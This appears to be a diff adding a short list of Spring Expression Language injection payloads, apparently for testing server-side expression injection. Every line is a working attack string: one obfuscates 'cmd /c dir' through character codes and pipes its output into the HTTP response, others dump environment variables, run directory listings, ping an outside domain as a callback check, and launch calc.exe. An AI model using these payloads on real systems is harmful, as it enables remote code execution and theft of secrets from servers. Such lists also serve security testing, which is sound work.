@@ -1,0 +1,5 @@
+(T(org.springframework.util.StreamUtils).copy(T(java.lang.Runtime).getRuntime().exec("cmd "+T(java.lang.String).valueOf(T(java.lang.Character).toChars(0x2F))+"c "+T(java.lang.String).valueOf(new char[]{T(java.lang.Character).toChars(100)[0],T(java.lang.Character).toChars(105)[0],T(java.lang.Character).toChars(114)[0]})).getInputStream(),T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream()))
+T(java.lang.System).getenv()[0]
+T(java.lang.Runtime).getRuntime().exec('ping my-domain.com')
+T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec("cmd /c dir").getInputStream())
+''.class.forName('java.lang.Runtime').getRuntime().exec('calc.exe')
